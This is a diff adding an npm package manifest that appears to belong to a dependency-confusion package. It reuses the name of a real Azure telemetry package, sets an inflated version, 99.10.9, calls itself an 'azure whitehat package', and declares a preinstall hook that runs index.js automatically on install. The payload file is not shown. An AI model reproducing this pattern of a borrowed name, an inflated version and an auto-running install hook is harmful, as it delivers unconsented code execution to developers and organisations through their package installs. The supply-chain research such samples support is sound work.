@@ -1,0 +1,39 @@
+{
+    "name": "azure-monitor-opentelemetry-exporter",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-monitor-opentelemetry-exporter@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-mJWXCprCBpUtMUlBts1jFLLX0DJmAakfACJj4cKMlqp/CcTcVg+ENmqLi0miVyCZ0ZwOpitrU8FM0+kM8ZQEfQ==",
+        "shasum": "ad3803b22d6e888bd9ffb4e7668157f59e04b995",
+        "tarball": "https://registry.npmjs.org/azure-monitor-opentelemetry-exporter/-/azure-monitor-opentelemetry-exporter-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3600,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoS3lCRA9TVsSAnZWagAA9dgP/isZa+YemINYB+DpeyZg\nDuGk18aZVGVFDn+1AlKe14G8VRsjCyDFfYcowiCcMVr0CwQCG8ht7oS1+83m\nMOcDFzLWj+wFMNgiK8nZc9UG8Ep2c+a1bsaPP62R3/h7sim8j8hPE8WqAnau\nNFP25e5HL7/a6HaJqTqlxcNnPI1izp4NlIwCBAOInsdbKHGVy6v4xvZvx19B\neCu1eU0x3k/WxriOIwnpaju39sqVLnRjwkxDl7Mjd5iNq+dtuiBD92cSYi5h\nTBmhOn4F1AcIGr6OBXp7txEtnyK/wh7ZxFDIY92aZCNKMusi/+yuvFyKvfsR\nDqgSSdOtPPRbDaRGkTy/fVsIRinrhFCb4DixXe+0GFOWk+etCjhOyHL8fiQH\n+31Png/3soUNRMJYagWqUZgaJtGEv1BihH7P9ZEcO2XKizimu9HoFXhvTj5g\nNnLZDIbsAgDXes+CB8Zqdl8b/lGrZhe3UaWDU2uGDug/N2NerKzJ/NJt6np3\nskpoubEQquNiXTAKonPCBhweFos7JBIzJKM8TgrhnjVRP3IxLSE3YmaHY5uP\n9vnMUQh/wF1MAw8Cm7WjpioJxhKRUolqjglx0m0UiX5ki5K55teBrWWo1ELf\nwkyn5scSYYJt7UCSRk7PjiB30mzpgayd0qyQEt0yDPctUn5LtvHIS1ADSIhk\nrqwm\r\n=DUYx\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-monitor-opentelemetry-exporter_99.10.9_1637952997062_0.8418603967172549"
+    },
+    "_hasShrinkwrap": false
+}
